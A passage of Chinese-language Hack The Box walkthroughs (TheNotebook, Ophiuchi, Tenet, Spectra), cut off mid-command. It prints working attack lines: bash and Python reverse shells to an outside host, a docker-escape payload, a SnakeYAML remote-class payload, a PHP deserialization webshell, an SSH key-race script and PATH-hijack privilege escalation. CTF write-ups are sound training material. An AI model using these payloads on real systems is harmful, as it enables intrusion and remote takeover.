咱们访问\n\n![](Hackthebox-TheNotebook/73645d78-5933-4ce5-b1c3-b53d18779f41.png)\n\n发现可以上传文件\n\n![](Hackthebox-TheNotebook/f99489ed-6001-4786-9298-150672387762.png)\n\n我们可以看到，管理员创建了一个笔记，意思是可以上传php文件\n\n[https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)\n\n咱们上传一个php马上去\n\n![](Hackthebox-TheNotebook/cdbfa09b-5422-4bfc-9d1c-fdc87f0aa5f8.png)\n\n![](Hackthebox-TheNotebook/5db51c62-197c-4952-83c9-59c0cb9959d9.png)\n\n成功获得一个www-data权限的shell\n\n**权限提升**\n\n![](Hackthebox-TheNotebook/b2072937-fd75-479f-a8cb-afff9497b4da.png)\n\n我们看管理员说存在backups备份文件\n\n![](Hackthebox-TheNotebook/58e20e35-2ab3-4d23-ac3d-216caf5d308c.png)\n\n咱们再/var/backups/目录下发现一个[home.tar.gz](http://home.tar.gz/)文件，咱们在靶机上开启http服务把他搞下来\n\npython3 -m http.server 8888\n\n![](Hackthebox-TheNotebook/9f7193bf-c54e-4dc2-bbe7-3eaa7e01dc1d.png)\n\n![](Hackthebox-TheNotebook/0158a21d-f415-4b49-9efb-da5bc35e6f6d.png)\n\n![](Hackthebox-TheNotebook/e62ecc12-6e6e-42c2-94dc-d486b5e3dbfb.png)\n\n我们找到了noah用户的公钥和私钥\n\n![](Hackthebox-TheNotebook/0b35c0c5-6062-4ab8-a010-6d4193e467d0.png)\n\n直接使用密钥登录，成功登录\n\n![](Hackthebox-TheNotebook/3b3da359-a5cf-4aca-9466-434893277951.png)\n\n成功拿到user权限的flag\n\n![](Hackthebox-TheNotebook/4b5b9fe9-3eac-4705-8f19-7874a6239905.png)\n\n咱们使用sudo -l查看一下sudo权限\n\n发现可以使用docker运行webapp-dev01这个脚本 \\* 代表可以接受人和参数\n\n![](Hackthebox-TheNotebook/70bac475-ba53-4841-bbeb-a57e212f2553.png)\n\n直接su成功切换到root用户\n\nsudo /usr/bin/docker exec -it webapp-dev01 sh -c \"su\"\n\n![](Hackthebox-TheNotebook/5a58e090-0bab-4283-96c7-12fb8deb13b0.png)\n\n我以为事情到这里就结束了，毕竟咱们已经拿到root权限了，接下来就是找到flag就好了，但是在寻找flag的时候\n\n![](Hackthebox-TheNotebook/7efcc029-3dd4-4279-b580-8db8db1fb5bb.png)\n\n发现root文件为空，再结合咱们所处的环境来进行判断，我不得不相信，我们居然是在一个docker里？所以现在还得进行docker逃逸？\n\n这个靶场，确实有难度的呀\n\n**docker逃逸**\n\n[https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)\n\n经过查询，发现docker exec是存在cve漏洞的 咱们可以直接利用\n\n![](Hackthebox-TheNotebook/b7af135e-eb37-4596-926b-3c6d77dff25f.png)\n\nvar payload = \"#! /bin/bash \\\\n bash -i >& /dev/tcp/10.10.14.184/4444 0>&1\"\n\n咱们下载下来后修改payload\n\n修改好payload以后，咱们使用golang进行编译\n\n![](Hackthebox-TheNotebook/118b622a-1483-4386-b10d-a803f457db81.png)\n\n然后上传到服务器内，在本地开启http服务\n\npython3 -m http.server 80\n\n![](Hackthebox-TheNotebook/7e42a6a4-68a6-4be4-9e52-b8423cf4bcb3.png)\n\n在本地启动nc进行监听\n\n![](Hackthebox-TheNotebook/a648b661-fbdc-4abc-94c7-fc64e189b0c3.png)\n\n上传后运行\n\n第一个root权限运行脚本\n\n![](Hackthebox-TheNotebook/7bed5f75-409e-4f9d-881b-c811690b3ec4.png)\n\n第二个noah权限运行指令\n\n![](Hackthebox-TheNotebook/020af329-4432-4dfc-821d-74b081db95a3.png)\n\n![](Hackthebox-TheNotebook/2ddff0ab-5bab-4c03-9f08-527c24d641b4.png)\n\n成功获得root权限\n\n![](Hackthebox-TheNotebook/35a7b161-62bb-4941-aa12-24ef6bff7410.png)\n\n![](Hackthebox-TheNotebook/6d106a27-e1d7-481a-bddb-fe9663d724c9.png)\n\n成功得到root权限flag\n\n最后总结：这台机器确实挺有难度的，我也是第一次碰到需要虚拟机逃逸的靶场。这台机器耗时两天，去掉睡觉和休息时间还有工作时间，耗时应该超过10小时，确实对得起这个难度。还是挺有意思的，学到了不少姿势，其中有一些玄学问题，请教了不少大佬\n\n此处在这感谢我叮叮师傅@ loid\n\n可算是做完了，这两天做的快脑溢血了，就是因为一天时间没有做出来，所以拖更了一天","tags":["Hackthebox"]},{"title":"Ophiuchi - Hackthebox","url":"/2021/06/01/Hackthebox/Medium/Hackthebox-Ophiuchi/","content":"\n# Hackthebox - Ophiuchi\n# 靶场信息\n![](Hackthebox-Ophiuchi/bb2b3b64-d318-4d4f-a0bc-165526dc65a5.png)\n\n# 靶场类型\n![](Hackthebox-Ophiuchi/48e28a0b-adc8-4b59-b453-51590cfdc576.png)\n\n# 信息搜集\n## Nmap\n首先使用nmap进行端口扫描\n\nnmap -A -sS -sC -sV 10.10.10.227\n\n![](Hackthebox-Ophiuchi/756fd8cc-a7bc-4287-b42c-7eb59a4fafda.png)\n\n## Http\n我们可以看到开启了22和8080端口，让我们访问8080端口看看\n\n![](Hackthebox-Ophiuchi/041547b0-274e-4b92-aec0-2bb99be365dd.png)\n\n这是个啥？一个YAML在线解析器，让我们随便输入点东西试试\n\n![](Hackthebox-Ophiuchi/b1baf97e-c71b-4085-a0e0-ad9329272546.png)\n\n此功能已暂停，嗯。。。有点意思\n\n我们先看看其他功能点，比如tomcat 版本为 Apache Tomcat 9.0.38\n\n直接登录试试，万一有0day呢？（弱口令）\n\n```bash\n[http://10.10.10.227:8080/manager](http://10.10.10.227:8080/manager)\n```\n咱们去登录试试\n\n![](Hackthebox-Ophiuchi/dee71ed1-c1e6-444a-9c01-d31dfbba76c4.png)\n\n测试了几个默认口令均无效，看来还是得把目光放到YAML上了，去google找找资料吧\n\n在搜索过程中，发现tomcat 9.0.38存在 Snake yaml 反序列化漏洞\n\nYAML在线解析器具有java类构造函数的功能\n\nOK，那思路就有了\n\n# 漏洞利用\n使用python3在本地开启一个http服务器\n\n```bash\npython3 -m http.server 80\n```\n![](Hackthebox-Ophiuchi/e34f7a11-fde0-4f05-9135-9287eac00b9a.png)\n\n使用YAML解析命令\n\n```bash\n!!javax.script.ScriptEngineManager [\n    !!java.net.URLClassLoader [[\n        !!java.net.URL [\"http://10.10.14.184/\"]\n    ]]\n]\n```\n![](Hackthebox-Ophiuchi/cc64a6f6-9f96-4115-ae06-8ba1fa5794b4.png)\n\n点击解析看看\n\n![](Hackthebox-Ophiuchi/010084b7-6c85-4974-8c0f-9a87f1b389b3.png)\n\n我们可以看到，虽然是失败，但确实/META-INF/services/javax.script.ScriptEngineFactory 向我们的机器发出了请求\n\n我们可以保持相同的文件结构来利用它，例如具有目录“META-INF”然后是 services 具有文件名的子目录 javax.script.ScriptEngineFactory，在该文件中，我们将调用我们的exploit\n\n![](Hackthebox-Ophiuchi/cd2958e3-d629-48c2-8606-1228204b5c55.png)\n\n创建一个文件，exploit.java 可以从这里获取java代码，然后我们将尝试ping我们的本地机器以查看exploit是否有效，以便我们获得反向shell\n\n> [https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java](https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java)\n\n将该代码保存为exploit.java\n\n![](Hackthebox-Ophiuchi/3f5a9c75-e4d6-4b4d-bb84-f255f2fabace.png)\n\n然后使用javac进行编译，即可得到.class文件\n\n![](Hackthebox-Ophiuchi/67d0a010-c44b-4972-b2f5-5a18b5d97121.png)\n\n我们将snakeyaml.exploit写入到javax.script.ScriptEngineFactory中\n\n![](Hackthebox-Ophiuchi/0e044d36-a0eb-4098-9047-35ce6b5c5d32.png)\n\n然后我们新建一个文件夹 snakeyaml，然后将文件结构这样放\n\n![](Hackthebox-Ophiuchi/a488d234-bf2a-45a1-830a-fbee6931ceff.png)\n\n然后我们在Ophiuchi目录下使用python3开启一个http服务器\n\n然后在YAML中属于我们第一次调用的poc来进行调用\n\n![](Hackthebox-Ophiuchi/640299e6-b57d-4268-a7fb-c8fc96dff19a.png)\n\n![](Hackthebox-Ophiuchi/af532cfd-00a6-4ebf-8b30-3bd48c715c91.png)\n\n成功\n\n然后我们在Ophiuchi目录中创建一个exploit.sh脚本\n\n![](Hackthebox-Ophiuchi/8d245e83-0a91-41a3-b9eb-5388d3289857.png)\n\n这个脚本是用来反弹shell用的\n\n然后我们本地使用nc开启一个监听端口\n\n```bash\nnc -nvlp 4444\n```\n然后，我们将wget将刚才写的bash脚本下载并保存到/tmp目录中，然后使用bash执行它，现在我们休要修改我们的exploit.java文件\n\n![](Hackthebox-Ophiuchi/ae33afab-b8a8-4acb-b849-072e9cceb132.png)\n\n然后重新编译exploit.java文件\n\n在YAML中继续执行我们刚才的代码\n\n![](Hackthebox-Ophiuchi/947d54ed-8ffe-4019-8430-fcdee7bebcc8.png)\n\n成功获取到shell，并且使用python3获得一个稳定的shell\n\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';\n```\nPS：如果这里没有获取到，那应该是java的版本不对，新版本java不行，必须得使用java class 55版本进行编译\n\n代码 javac --release 11 exploit.java\n\n然后我们我们知道，该web服务器是使用apache tomcat进行搭建运行的，所以我们现在去查看tomcat的配置文件\n\n使用find命令进行查找\n\n```bash\nfind / -name \"tomcat-users.xml\" 2>/dev/null\n```\n![](Hackthebox-Ophiuchi/f0bd46a5-2084-41a4-a667-6c8494772caa.png)\n\n找到了，然后使用cat查看即可\n\n![](Hackthebox-Ophiuchi/0f03f868-418c-4610-835b-1d7bb8f7bfcd.png)\n\n得到了账号密码\n\n```bash\nusername = admin\npassword = whythereisalimit\n```\n我们查看一下这台机器的账户\n\n![](Hackthebox-Ophiuchi/7620f6a9-e804-450d-894b-e5378b0e340f.png)\n\n我们可以看到，这台linux的机器上，admin居然是一个账户，而且权限还不低？出题人扣十分 记大过一次\n\n咱们直接使用su进行登录或使用ssh进行登录即可\n\n![](Hackthebox-Ophiuchi/83b665cd-06ff-4292-b05b-1352e56e401c.png)\n\n![](Hackthebox-Ophiuchi/dfe0645f-3e73-4712-b796-e2181c60f15d.png)\n\n成功拿到user权限的flag\n\n# 权限提升\n使用sudo -l查看咱们的sudo权限\n\n![](Hackthebox-Ophiuchi/20433e2b-d9ad-44c1-a3fd-f1b1236b9994.png)\n\n咱们发现，可以直接使用root权限执行/opt/wasm-functions/index.go文件，那提权的突破口肯定在这了，咱们查看一下吧\n\n![](Hackthebox-Ophiuchi/1dd916a3-c826-4e51-9740-a4d9f90b2e54.png)\n\n进行代码审计，咱们可以看到。它会读取Web程序集二进制文件，然后它会从info函数中获取一个值，如果该值不等于1，程序将会输出“Not ready to deploy”，不然将会执行一个deploy.sh脚本\n\n有一点需要注意， main.wasm 和 deploy.sh 在源代码中没有绝对路径，这意味着我们可以创建自己的文件，然后使用 PATH 变量。 所以首先我要下载 main.wasm 到我的机器上\n\n在目标机器目录/opt/wasm-functions目录中使用Python3开启一个服务器\n\n![](Hackthebox-Ophiuchi/31f233b9-828c-4253-9adc-981211e9652e.png)\n\n然后使用wget下载\n\n![](Hackthebox-Ophiuchi/797a4f37-cc84-46cb-92fc-29dc7af4fb2e.png)\n\n> [https://github.com/LucifielHack/wabt](https://github.com/LucifielHack/wabt)\n\n这里使用一个名为wabt(Web Assembly Binary Toolkit)的工具，我们需要将main.wasm文件转换为.wat文件，因为它是该二进制文件的文本格式。但在此之前首先让我们使用wasm-decompile查看二进制文件中的info函数，它将二进制文件反编译为C语言的格式\n\n```bash\n./wabt/build/wasm-decompile main.wasm -o main.dcmp\n```\n![](Hackthebox-Ophiuchi/0592ab35-2de8-41cf-99c9-e1695cca12ce.png)\n\n我们可以看到该info函数返回值0，这就是我们要修改的内容了\n\n将.wasm转换为.wat文件\n\n```bash\n./wabt/build/wasm2wat main.wasm -o main.wat\n```\n![](Hackthebox-Ophiuchi/82c8f524-eb44-493c-8929-92b3d8148b96.png)\n\n然后打开main.wat文件\n\n![](Hackthebox-Ophiuchi/fd7957cb-5d3e-48eb-8c96-3cff495d8975.png)\n\n我们可以看到const值为0\n\n我们将它改为1\n\n现在我们需要修改回二进制形式(.wasm) 因此我们需要将.wat转换为.wasm\n\n```bash\n./wabt/build/wat2wasm main.wat -o main.wasm\n```\n![](Hackthebox-Ophiuchi/b19efc93-d4e6-4c84-81d8-06e5959168ec.png)\n\n将main.wasm上传到/tmp目录\n\n![](Hackthebox-Ophiuchi/3df470b1-4aee-42fe-bd5e-65828c0c970b.png)\n\n咱们制作一个deploy.sh文件在/tmp目录\n\n![](Hackthebox-Ophiuchi/e3a4e5d8-691e-4576-98fd-a1521a0b44cc.png)\n\n现在添加/tmp到PATH变量并以sudo的形式运行golang源代码\n\n```bash\nexport PATH=/tmp:$PATH\necho $PATH\n```\n![](Hackthebox-Ophiuchi/776d0636-eb2f-4262-bd74-02dec07b882d.png)\n\n![](Hackthebox-Ophiuchi/f9e1d7d9-c073-4698-956d-d1acc9742c76.png)\n\n大家可以看到，已经运行成功了，直接使用bash -p进行提权即可\n\n![](Hackthebox-Ophiuchi/4a2b916b-955e-447a-95dd-44194c798cbc.png)\n\n提权成功\n\n![](Hackthebox-Ophiuchi/a4a5d501-2fda-4870-b46d-bd68c5834b4b.png)\n\n成功获得root权限的flag\n\n收工睡觉","tags":["Hackthebox"]},{"title":"Tenet - Hackthebox","url":"/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/","content":"\n# Hackthebox - Tenet\n**Hackthebox - Tenet 靶场实战**\n\n**靶场信息**\n\n![](Hackthebox-Tenet/052e12b1-d487-454a-96ea-6cb1d819c2d7.png)\n\n**靶场类型**\n\n![](Hackthebox-Tenet/e26be302-dfe3-4c5f-8ee2-9cf4dd4c513e.png)\n\n**信息搜集**\n\n首先使用nmap进行端口扫描\n\nnmap -A -sS -sC -sV 10.10.10.223\n\n![](Hackthebox-Tenet/917d4824-d2ed-4bb3-98e7-02b596d30dc5.png)\n\n我们可以看到，本台靶场开启了22和80端口，咱们访问80端口看看\n\n![](Hackthebox-Tenet/510b16ce-e566-4cee-9b1c-3fa47b010102.png)\n\n访问80端口后发现是一个apache2的默认页面，那就可以确定是apache的漏洞入手了\n\n简单查看了一下，没有其他啥东西，咱们先爆个目录吧\n\n懒得使用鼠标了，所以这里咱们使用gobuster进行爆破\n\ngobuster dir -u http://10.10.10.223 -x php,log,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --wildcard -o gob\n\n![](Hackthebox-Tenet/1d1057cd-a1c1-4815-837d-30878bb41e4a.png)\n\n找到了一个文件一个目录\n\n/users.txt\n\n/wordpress\n\n咱们先看看/users.txt文件\n\n![](Hackthebox-Tenet/22450566-01f0-4d3a-bee9-e719ce6a9e13.png)\n\n得到了一个用户名Success，先记录下来，咱们去看看wp\n\n![](Hackthebox-Tenet/8802405b-2c02-4328-b5a3-4c97deee5090.png)\n\n嘛玩意儿？你告我这是wordpress？我都准备好砸exp了结果你告诉我这？\n\n![](Hackthebox-Tenet/41c08274-6a77-4b1a-976b-c9938649309b.png)\n\n翻了一下网页源代码，在css里发现了一个域名tenet.htb，成吧，还是得去/etc/hosts里添加一个解析。\n\nvim /etc/hosts\n\n![](Hackthebox-Tenet/195b271b-532e-405e-a4f7-008e88c29081.png)\n\n![](Hackthebox-Tenet/a5902ad7-b1af-4e5d-9e2a-2885cff75b7c.png)\n\n添加后再访问就对劲了\n\n![](Hackthebox-Tenet/72ef8706-0f0b-46eb-b711-5a10e9b11792.png)\n\n这里发现有一些文章，但是我这小学英语都不及格的水平…没办法，开翻译器吧\n\n然后我们在其中一篇《Migration》上，找到了一条评论\n\n![](Hackthebox-Tenet/76168e08-a677-4477-8e83-6584b37021e2.png)\n\n经过机翻+我个人的理解后，大致意思如下：\n\n你是否删除了sator.php的备份文件？迁移文件不完整，你为啥要这样做？你图啥？（最后一句我自己加的，文里没有）\n\n整理一下目前我们得到的信息\n\n两个用户，分别为neil和管理员protagonist（猜测，证据如下图）\n\n![](Hackthebox-Tenet/7da31670-8c15-4117-933d-1835f04a5b77.png)\n\n和一个php文件 sator.php\n\n思路整理，用户neil质问管理员为什么在迁移web程序的时候删除了sator.php从而导致了网站文件不完整，也就是说wordpress目录下是不可能存在这个文件的。但是咱们又要利用到这个文件，那在一开始的apache2目录下尝试一下？\n\n![](Hackthebox-Tenet/d2677dfb-581d-4c65-a9ac-254f924a6678.png)\n\n似乎没有什么有用的信息，我又回去看了一下neil用户的评论。\n\n等等？备份文件？那意思就是bak文件？咱们尝试一下\n\n![](Hackthebox-Tenet/812e216b-f58f-455a-9b7a-fc9f0fda06ce.png)\n\n我可真是太棒了，现在是凌晨四点，奖励自己一顿烧烤，长胖了都是你们的责任，记得背锅\n\n![](Hackthebox-Tenet/bc98f7d1-8cae-4d46-b9d7-f2579498d0d5.png)\n\n成功搞到一份php源码，审计吧。\n\n但是吧，审计确实是我的短板，所以怎么办呢？这个时候丢给“朋友”就好了，老白嫖了\n\n**原理讲解**\n\n我们可以在这里看到，有一个类 DatabaseExport，其中有两个公共变量 user\\_file、data 并且在这个类中，有一个公共函数被调用 update\\_db()，该函数将 data 变量设置为“Success”，这只是一个txt文件，正如你从 sator.php 中看到的那样，最后的网络浏览器有一个magic函数（这个找资料的时候看到的，但我不知道怎么翻译）\\_\\_destruct()，当一个对象被销毁时，它会自动调用 user\\_file 将使用来自 data 的内容并将其放入web目录中，这意味着在web目录中创建 users.txt 数据“Success”。\n\n最后我们可以 GET 参数 arepo，现在这里存在一个漏洞，称为“PHP反序列化”\n\n因此，要利用这一点，我们必须修改在这种情况下，类变量 user\\_file，并将 data 序列化，一旦我们得到了序列化字符串，我们把它传递给 arepo 参数中。\n\n**漏洞利用**\n\n虽然我代码审计很弱，但我大概看懂了，它生成了一个名为users.txt的文件，内容为Success，那咱们让他生成php文件然后写入一句话木马，这不就成了？\n\n这不就是妥妥的php反序列化吗？\n\n代码\n\n';\n\n}\n\n\\$test = serialize(new DatabaseExport);\n\necho \\$test;\n\n?>\n\n将上面的代码保存为php文件，然后执行后会得到一个php序列化\n\n![](Hackthebox-Tenet/82445885-959a-4e87-b66b-60e312f62434.png)\n\n然后我们需要以url编码的形式把它传递给 GET 参数，所以我们使用cyberchef（或其他工具）来完成\n\n[https://gchq.github.io/CyberChef/#recipe=URL\\_Encode(false)](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false))\n\n![](Hackthebox-Tenet/76ded797-b7b3-4f60-bc35-be843a330dce.png)\n\nO:14:%22DatabaseExport%22:2:%7Bs:9:%22user\\_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system(\\$\\_GET%5B%22cmd%22%5D);?%3E%22;%7D\n\n咱们通过 GET 传输，直接粘贴到url里\n\n[http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user\\_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system(\\$\\_GET%5B%22cmd%22%5D);?%3E%22;%7D](http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D)\n\n![](Hackthebox-Tenet/309140ae-90f9-44ef-9a4d-b0367be53ae4.png)\n\n提示已经更新了，那就是成功了\n\n![](Hackthebox-Tenet/7ee24b68-d72c-4e3f-8a5c-32ee37880c75.png)\n\n成功执行命令，我们拿到了一个webshell\n\n熟悉我的读者们都知道，我比较喜欢利用python3\n\n所以咱们直接看看是否存在python3\n\n![](Hackthebox-Tenet/fa4bc5e7-01a0-4afc-ae9c-657a66a2b170.png)\n\n哦豁 存在python3，这是一件很幸运的事情\n\n咱们直接用python3进行反弹shell\n\n本地监听4444端口\n\n![](Hackthebox-Tenet/013c36bf-378f-4e5c-af8c-6064ce6fd756.png)\n\nhttp://10.10.10.223/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM);s.connect((\"10.10.14.184\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n\n![](Hackthebox-Tenet/f83eedae-42d6-4040-acb8-68daeeb7eb2a.png)\n\n成功得到了一个稳定的shell，芜湖，起飞\n\n由于我们现在只是www-data用户，权限低的很，现在还得先获取到一个正常的用户\n\n![](Hackthebox-Tenet/e64831ef-31e4-4efc-bb62-24d44448d847.png)\n\n咱们检查一下cron的工作\n\n![](Hackthebox-Tenet/45c3c0c8-98a1-40b3-927c-15de5fcac111.png)\n\n检查一下开放的端口\n\n已经有思路了啊兄弟们\n\n我们可以看到3306端口在我们本地运行着，那多半就是mysql了，咱们直接找mysql的配置文件啊\n\n我记得我以前打过很多wordpress的站（抱歉，都是涉密项目，所以不方便写成文章），在wp-config.php文件里，一般会有数据库的账号密码的，咱们去读取试试\n\n![](Hackthebox-Tenet/2273a301-6e35-470f-9ef3-5c40c0950f74.png)\n\n成功拿到\n\nDB\\_NAME = wordprss\n\nDB\\_USER = neil\n\nDB\\_PASSWORD = Opera2112\n\n![](Hackthebox-Tenet/c5b21ad5-d79e-4d50-939e-99226e18255e.png)\n\n登陆失败？那这暗示就很明显了，应该是一个用户了，咱们看看去，\n\n![](Hackthebox-Tenet/70e5b2a7-4b5c-444c-a521-812740adc06e.png)\n\n等会儿？我以为这是一个数据库用户，没想到权限还挺大？\n\n咱们直接登录吧\n\n![](Hackthebox-Tenet/e3601cf5-5ee5-4573-8ca2-9d706bc49349.png)\n\n登录成功\n\n![](Hackthebox-Tenet/5a7c71ed-46fc-4538-906e-d20ac17a1927.png)\n\n成功拿到user权限的flag\n\n**权限提升**\n\n咱们老规矩，sudo -l查看一下sudo权限\n\n![](Hackthebox-Tenet/c73c01db-e931-4914-9a50-d09c51c3ccc9.png)\n\n发现可以直接用root权限执行enableSSH.sh文件，那提权还不简单？在根目录下本来就存在一个exp.sh，这不提示就来了？咱们查看一下\n\n![](Hackthebox-Tenet/be744f9d-7f9e-4070-bf01-90f99b38c270.png)\n\n我怎么看着有点不对劲呢。。。\n\n在迟疑了大概1.25秒后，我悟了！\n\n这TM是其他哥们儿做过后留下的提权脚本！这根本就不是我要的东西！\n\n我丢啊，稍等各位，我先重置一下靶场，再来一次\n\ncat /usr/local/bin/enableSSH.sh\n\n![](Hackthebox-Tenet/c9bf7956-8bd6-47fa-ad21-d7eb0ed00b92.png)\n\n查看这个sh文件才对，刚才搞错了，请大家无视哈\n\n这些内容都比较无聊，咱们直接拉到最底下\n\n![](Hackthebox-Tenet/e0306962-583f-490b-a657-6bf6a06c9e03.png)\n\n我们可以看到一个addkey()使用命令创建临时文件的函数mktemp\n\n![](Hackthebox-Tenet/8e2b1fbc-ff18-43e5-8fdc-54e70d9b0c93.png)\n\n如果我们在本地机器上运行此命令查看它生成的文件名，我们可以看到每次运行此命令时，文件名都是不一样的\n\nmktemp -u /temp/ssh-XXXXXX\n\n![](Hackthebox-Tenet/9b8b4d9a-eb01-451b-bde1-97247a36efe5.png)\n\n摸了摸我并不存在的头发，这玩意儿真让人头秃\n\n公共密钥获取方法\n\nssh-keygen 然后根据我们自己的情况进行设置，然后文件保存在/root/.ssh/id-rsa.pub中\n\n将如下代码保存到exp.sh文件\n\nwhile true\n\ndo\n\necho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoVUNa8uk2pi8tECc1c6SsFbq1xlNvnhwzqgEjmN6yyp8u7TIC4VbzgyRC2UnN9dM0wn9mP103gIAxLGXxgy5kl+cquFffZPoOjfd9I4ZLFDHaPr6eXbXSCg445UXG1gAj8b7lPGemz6vApGrlMGjl1TABKMBHCTbzqSVoAxaDZXSiF4kIKKU4b2Dx8Uw7XgTdd+KWZnuIozuYyZlD3+cl//inLetupgpP0ZBvcBqAr1UqtCxsMx2Yzy3XfQ/VQMW4Qeswuvx98P+kP6wqpq2jXxaEoRkyVcIlQekJg1W+XwuuNixQeli7CQQBgqu7FwUYrftlWZm0br3HNQlVwBgB+zqExOmt8iktcHjw3pLetwI7X7sdB5pUS4QN2hwDDQsAuhaGMt4MAWSLKsgEZJxWT4FTH2R5+eTCXZNbH97aGbH0/ONmzZFKm9bOwvnflQ5taIe149JbuPMc6sba5C4FROHagprucjaPDYhp/v0q0ztKq2G9Ay5yfCTTFj5sYuk= root@root' |tee /tmp/ssh-\\*\n\ndone\n\n![](Hackthebox-Tenet/1a888b74-7bfe-4800-83ac-7bd83c678b42.png)\n\n添加运行权限 chmod +x exp.sh\n\n然后运行./exp.sh\n\n然后咱们再开一个ssh连接\n\n然后咱们在新开的ssh连接上运行’ sudo /usr/local/bin/enableSSH.sh’几次\n\n![](Hackthebox-Tenet/ebd0886d-924b-4668-a864-d7100ab2925f.png)\n\n然后咱们测试一下是否可以连接\n\nssh [root@10.10.10.223](mailto:root@10.10.10.223) -i id\\_rsa\n\n如果不行，咱们就再来一次即可\n\n![](Hackthebox-Tenet/0886872f-de0a-4337-a3ca-5e5c223f6ea8.png)\n\n成功拿到root权限的flag\n\n正好这个时候我点的烧烤也到了，吃夜宵去","tags":["Hackthebox"]},{"title":"Spectra - Hackthebox","url":"/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/","content":"\n# Hackthebox - Spectra\n**靶场信息**\n\n![](Hackthebox-Spectra/40981969-2f32-4be6-8b07-40b92a4f8fe4.png)\n\n**靶场类型**\n\n![](Hackthebox-Spectra/e12c6638-da63-4441-8d4d-b1cf416dcc33.png)\n\n**信息搜集**\n\n使用nmap进行基本的端口扫描\n\nnmap –A -sS -sC -sV 10.10.10.229\n\n![](Hackthebox-Spectra/4756298a-80cc-4ef3-8796-eb5e8011f671.png)\n\n我们发现开启了22、80和3306端口\n\n咱们访问80端口看一下\n\n![](Hackthebox-Spectra/c7f9bfc1-a2aa-4540-9f7a-e7044581761b.png)\n\n内容非常简单，咱们看一下源代码\n\n![](Hackthebox-Spectra/bb614980-11ea-49fa-a25b-2a6d432a7b87.png)\n\n发现会跳转到域名spectra.htb 咱们在hosts里添加该域名\n\nvim /etc/hosts\n\n10.10.10.229 spectra.htb [www.spectra.htb](http://www.spectra.htb/)\n\n然后咱们访问一下试试\n\n![](Hackthebox-Spectra/9c1f59e2-8bb8-43bd-86fd-8f7cc90e08f5.png)\n\n咱们可以看到这是一个wordpress的站点\n\n到处点了一下似乎没有可用的东西，咱们看看另一个连接\n\n![](Hackthebox-Spectra/824a6c95-d993-4fd1-9763-5ee2f684ad8a.png)\n\n建立数据连接错误，既然提示这个，又开启了3306端口，那么后面估计是一定会用到的，咱们先记录一下，后面很有可能会用到，然后把眼光放回第一个页面\n\n咱们目前思路卡壳了，不知道做什么了，那就扫描一下目录吧，我这里使用dirbuster工具进行目录爆破吧\n\n![](Hackthebox-Spectra/c5e556ac-5a56-4755-b682-933d401ec916.png)\n\n导入后按start启动扫描\n\n![](Hackthebox-Spectra/9c0bedcb-a66d-4f86-80d7-634638611d86.png)\n\n扫描的同时我也在挨个看，发现/testing/目录下存在目录遍历漏洞，咱们进入看看\n\n![](Hackthebox-Spectra/7328b157-ccaa-48c3-b437-241fd55559e2.png)\n\n进来后发现又一些php文件，看文件名似乎还有配置文件，咱们挨个查看一下\n\n![](Hackthebox-Spectra/78e79639-fd14-425c-b7c0-2eed375e6101.png)\n\n在一圈文件查看下来后都没有看到什么有用的信息，但在文件wp-config.php.save的时候，点进去却是空白页面，但文件大小处却又明确显示是有内容的，这一点引起了我的注意\n\n咱们看一下网页源代码\n\n![](Hackthebox-Spectra/33b630df-0b2f-40eb-804e-d439b5ed5759.png)\n\n咱们居然在这找到了数据库的账号密码，看来运气还是不错的\n\ndb\\_name = dev\n\ndb\\_user = devtest\n\ndb\\_password = devteam01\n\n**漏洞利用**\n\n这里既然拿到了数据库账号密码，又开启了3306端口，咱们自然是尝试进行登录了\n\nmysql --host 10.10.10.229 --user devtest --password devteam01 -D dev\n\n![](Hackthebox-Spectra/7f60926b-0f97-494b-a744-60adde3f9b30.png)\n\n但是这里却显示登录失败？不允许连接到这个数据库\n\n嗯。。。看来果然没我想的那么简单啊，那么现在唯一用得到账号密码的，就只有wordpress了，咱们只能从这里继续入手了\n\n[http://spectra.htb/main/wp-login.php](http://spectra.htb/main/wp-login.php)\n\n![](Hackthebox-Spectra/686ef251-eba4-4521-aa7d-7165b488e7a6.png)\n\n咱们进行登录\n\n直接使用之前获取到的数据库账号devtest进行登录却提示没有这个账号\n\n![](Hackthebox-Spectra/bf1da408-1c5a-44aa-9068-ce59568085b7.png)\n\n看来果然没有我想的那么简单，我大意了，没有闪\n\n![](Hackthebox-Spectra/fadb6925-8c3c-4b4a-808e-14a6d99017a9.png)\n\n好在这个时候，突然灵感从天而降，发现主页有一篇文章，最经典的一句“hello world”，but 咱们的重点不在这里，而是在发帖人，administrator\n\n好家伙，这不就有用户名了嘛？而且同时咱们nmap没有识别出操作系统，看到这个就可以怀疑是windows了\n\n![](Hackthebox-Spectra/868533cb-0788-4021-9b62-77f6eb081c8a.png)\n\n咱们使用账户administrator 密码devteam01进行登录，成功进入后台\n\n![](Hackthebox-Spectra/08318735-1667-416e-a8ba-026a8a53d30b.png)\n\n并且获取到wordpress的版本为5.4.2\n\n拿到版本了，就可以使用已知漏洞进行攻击了\n\n咱们这里有三种办法获得shell\n\n第一种：\n\n使用msf进行负载攻击\n\nuse exploit/unix/webapp/wp\\_admin\\_shell\\_upload\n\nset USERNAME administrator\n\nset PASSWORD devteam01\n\nset TARGETURI /main\n\nset 